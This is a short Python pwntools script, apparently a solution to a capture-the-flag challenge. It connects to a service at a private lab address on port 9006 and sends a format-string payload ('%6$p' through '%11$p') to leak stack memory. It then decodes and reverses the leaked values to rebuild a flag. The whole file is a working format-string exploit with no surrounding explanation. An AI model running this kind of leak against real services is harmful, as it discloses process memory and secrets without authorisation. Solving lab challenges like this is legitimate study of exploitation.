from pwn import *
import binascii

context(arch="amd64", os="linux", endian="little")

r = remote("10.10.208.100", 9006)

r.clean()

fmt_str = b"%6$p\n%7$p\n%8$p\n%9$p\n%10$p\n%11$p"

r.sendline(fmt_str)

r.recvuntil(b"Thanks ")

flag =  binascii.unhexlify(r.recvline()[2:-1])[::-1]
flag += binascii.unhexlify(r.recvline()[2:-1])[::-1]
flag += binascii.unhexlify(r.recvline()[2:-1])[::-1]
flag += binascii.unhexlify(r.recvline()[2:-1])[::-1]
flag += binascii.unhexlify(r.recvline()[2:-1])[::-1]
flag += binascii.unhexlify(r.recvline()[2:-1])[::-1]

log.success(f"Flag: {flag.decode()}")
